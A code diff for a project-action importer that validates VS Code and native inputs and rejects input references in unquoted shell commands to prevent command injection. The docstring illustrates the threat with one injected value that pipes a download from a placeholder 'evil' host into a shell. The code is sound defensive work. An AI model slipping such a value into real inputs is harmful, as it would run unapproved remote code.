@@ -445,11 +445,16 @@ def _vscode_inputs(document: dict[str, Any]) -> tuple[ActionInput, ...]:
         if not identifier or kind not in {"promptString", "pickString"}:
             continue
         options = _strings(item.get("options"), "input options") if kind == "pickString" else ()
+        if kind == "pickString" and not options:
+            # VS Code treats a `pickString` with no options as a broken input too.
+            # Dropped rather than imported as an unrunnable prompt.
+            continue
+        default = str(item.get("default") or "")
         declared.append(
             ActionInput(
                 identifier,
                 str(item.get("description") or identifier),
-                str(item.get("default") or ""),
+                default or (options[0] if options else ""),
                 "choice" if kind == "pickString" else "string",
                 options,
             )
@@ -522,6 +527,13 @@ def _vscode_actions(path: Path, root: Path) -> tuple[list[ProjectAction], list[s
         if not batches:
             diagnostics.append(f"{label}: no step runs on {current_platform()}")
             continue
+        try:
+            _reject_unquotable_inputs(
+                tuple(step for batch in batches for step in batch), label
+            )
+        except ValueError as exc:
+            diagnostics.append(str(exc))
+            continue
         used = _referenced_inputs(batches)
         actions.append(
             ProjectAction(
@@ -555,6 +567,35 @@ def _for_this_platform(
         if runnable:
             kept.append(runnable)
     return tuple(kept), dropped
+
+
+def _reject_unquotable_inputs(steps: tuple[ActionStep, ...], label: str) -> None:
+    """Refuse an input reference that would reach a shell as syntax, not as a value.
+
+    Every other place an input lands is quoted or is not shell-parsed at all:
+    a `process` step's argv goes to CreateProcess verbatim, `cwd` and `env` are
+    spawn fields, and a `shell` step *with* args has both its command and each arg
+    quoted for the target shell by `_shell_command_line`.
+
+    The exception is a `shell` step with no args, whose command string is passed
+    through untouched so repository-authored shell syntax keeps working. An input
+    substituted there would be shell syntax too, so
+    `command = "git checkout ${input:branch}"` with `branch = "x; curl evil | sh"`
+    would run a second command that no human ever approved. That is precisely the
+    property the trust boundary rests on, so it is refused at discovery rather than
+    quoted at run time: quoting would need the shell dialect, which is not resolved
+    until spawn, and a rule the author can see is better than one they cannot.
+    """
+    for step in steps:
+        if step.kind != "shell" or step.args:
+            continue
+        if _INPUT_REFERENCE.search(step.command):
+            raise ValueError(
+                f"{label}: a shell step with no args passes its command to the shell "
+                f"unquoted, so it cannot carry an input. Move the value into args "
+                f'(command = "git", args = ["checkout", "${{input:...}}"]) or use '
+                f'type = "process".'
+            )
 
 
 def _referenced_inputs(batches: tuple[tuple[ActionStep, ...], ...]) -> frozenset[str]:
@@ -658,6 +699,12 @@ def _native_inputs(raw: dict[str, Any], label: str) -> tuple[ActionInput, ...]:
         default = str(item.get("default") or "")
         if kind == "choice" and default and default not in options:
             raise ValueError(f"native action {label} input default must be one of its options")
+        if kind == "choice" and not default:
+            # A choice with no default is unrunnable as presented: the empty string
+            # matches no option, so the select renders blank and submitting it fails
+            # the same validation. The first option is the only defensible answer,
+            # and it is the one a picker would have shown at the top anyway.
+            default = options[0]
         parsed.append(
             ActionInput(identifier, str(item.get("label") or identifier), default, kind, options)
         )
@@ -723,6 +770,7 @@ def _native_actions(path: Path, root: Path) -> tuple[list[ProjectAction], list[s
         if not batches:
             diagnostics.append(f"{label}: no step runs on {current_platform()}")
             continue
+        _reject_unquotable_inputs(tuple(step for batch in batches for step in batch), label)
         used = _referenced_inputs(batches)
         unused = sorted(input_ids - used)
         if unused:
